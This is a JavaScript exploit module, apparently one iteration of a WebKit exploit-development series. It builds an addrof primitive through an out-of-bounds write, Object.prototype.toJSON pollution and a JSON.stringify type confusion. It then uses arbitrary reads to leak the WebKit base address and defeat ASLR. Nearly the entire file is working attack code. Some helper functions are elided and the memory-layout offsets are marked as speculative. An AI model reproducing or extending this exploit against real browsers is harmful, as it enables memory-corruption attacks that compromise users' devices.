// js/script3/testArrayBufferVictimCrash.mjs (R53 - addrof via Fake String)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Exploit_R53_FakeStringAddrof";

const PROBE_CALL_LIMIT_V82 = 10;
const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;

// Offsets para WebKit Leak
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

// Assumindo que a primeira propriedade de um JSObject começa em 0x10 após o JSCell header.
// Vamos colocar nosso ponteiro falso lá.
const FAKE_STRING_DATA_PTR_PROP_NAME = "p2"; // Nome da propriedade que simulara o data pointer
const JSObject_first_prop_offset = 0x10;

let addrof_primitive = null;
let target_function_for_addrof;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

// Função para extrair o endereço de um JSON stringificado
function extractAddressFromJSON(json_str) {
    if (typeof json_str !== 'string') return null;
    try {
        const parsed = JSON.parse(json_str);
        // Procurar o valor que corresponde à nossa propriedade 'leaky_string'
        let leaky_val = parsed?.m2_payload?.leaky_string;
        if (typeof leaky_val !== 'string' || leaky_val.length < 4) return null;

        logS3(`   String vazada encontrada no JSON: "${leaky_val}"`, "leak");
        // Extrair os 8 bytes (4 caracteres unicode)
        const low = (leaky_val.charCodeAt(1) << 16) | leaky_val.charCodeAt(0);
        const high = (leaky_val.charCodeAt(3) << 16) | leaky_val.charCodeAt(2);
        return new AdvancedInt64(low, high);
    } catch (e) {
        return null;
    }
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R53() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Fake String ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init FakeString...`;

    target_function_for_addrof = function someUniqueLeakFunctionR53_FakeString() {};

    logS3(`--- Fase 0 (FakeString): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { coreOOBReadWriteOK = false; logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (FakeString): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (FakeString): Não iniciado.", webkit_base_candidate: null },
    };

    try {
        let victim_ta_for_json_trigger = null;
        let m1_ref = null; 
        let m2_ref = null; 
        let tc_detected = false;
        let stringify_result_raw = null;

        const fake_string_probe_toJSON = () => {
            if (this === victim_ta_for_json_trigger) {
                // Objeto cujo endereço queremos
                let obj_to_leak_addr = { a: target_function_for_addrof };

                // Criar o M2 para se parecer com um JSString.
                // A chave é alinhar a propriedade `leaky_string_data` com o offset de `m_data` de um JSString.
                // Assumimos que o layout do JSString é | JSCell (8B) | length (4B) | flags (4B) | data_ptr (8B) |
                // Para um JSObject, as propriedades começam no butterfly (offset 0x10).
                // Vamos criar propriedades para tentar alinhar.
                m2_ref = {
                    // Estas propriedades visam preencher os primeiros 16 bytes da área de propriedades inline.
                    // Isso é altamente especulativo e pode precisar de ajuste fino.
                    p0: 0, p1: 0,
                    // Esperamos que esta propriedade se alinhe com o ponteiro de dados de um JSString.
                    leaky_string: obj_to_leak_addr,
                    // ID para verificação
                    id: "M2_FakeString"
                };
                
                m1_ref = { id: "M1_FakeString", m2_payload: m2_ref };
                return m1_ref;

            } else if (this === m2_ref) {
                logS3(`[PROBE_FakeString] TC CONFIRMADA! 'this' é M2(FakeString). Deixando stringify vazar o endereço...`, "vuln");
                tc_detected = true;
                
                // O motor precisa ser enganado a pensar que `this` é uma string.
                // Uma forma é corromper o StructureID de M2 para ser o de uma string.
                // Como não podemos fazer isso ainda, dependemos da TC ser "profunda" o suficiente.
                // Para ajudar o stringify, podemos dar a ele um .toString() customizado.
                this.toString = () => {
                    logS3("   M2(FakeString).toString() foi chamado. Retornando propriedade que vaza.", "debug_detail");
                    // JSON.stringify pode chamar .toString() e depois stringificar o resultado.
                    return this.leaky_string; 
                };

                // A propriedade `length` é crucial para strings.
                Object.defineProperty(this, 'length', { value: 8, writable: false });
                
                return this;
            }
            return {};
        };
        
        victim_ta_for_json_trigger = new Uint32Array(8);
        victim_ta_for_json_trigger.fill(0);

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);

        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: fake_string_probe_toJSON, writable: true, configurable: true, enumerable: false });
            polluted = true;
            stringify_result_raw = JSON.stringify(victim_ta_for_json_trigger);
        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

        if (!tc_detected) throw new Error("Falha ao acionar a Confusão de Tipos.");
        logS3(`   JSON.stringify raw output: ${stringify_result_raw}`, "leak");

        const leaked_addr_container = extractAddressFromJSON(stringify_result_raw);
        if (!isValidPointer(leaked_addr_container, "_leakedContainerAddr")) {
            throw new Error("Falha ao extrair um endereço válido da saída do JSON.stringify.");
        }
        
        logS3(`   !!! ADDROF(obj_to_leak_addr) = ${leaked_addr_container.toString(true)} !!!`, "success_major");
        
        // Com addrof(container), lemos o ponteiro para a função alvo
        const addr_of_target_func = await arb_read(leaked_addr_container.add(JSObject_first_prop_offset), 8);
        if (!isValidPointer(addr_of_target_func, "_addrOfTargetFuncFinal")) {
            throw new Error(`Ponteiro lido para target_function_for_addrof é inválido: ${safeToHex(addr_of_target_func)}`);
        }

        logS3(`   !!! ADDROF(target_function_for_addrof) = ${addr_of_target_func.toString(true)} !!!`, "success_major");
        result.addrof_result = { success: true, msg: "addrof obtido via Fake String e TC.", leaked_object_addr: addr_of_target_func.toString(true) };
        
        // Fase 3: WebKit Leak
        logS3(`--- Fase 3 (FakeString): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
        // ... (resto da lógica do WebKit Leak)
        if (!isValidPointer(ptr_exe, "_wkLeakExeFakeString")) throw new Error("Ponteiro para Executable inválido.");
        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmFakeString")) throw new Error("Ponteiro para JIT Code/VM inválido.");
        const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
        logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

        result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;

    } catch(e) {
        logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }
    return result;
}
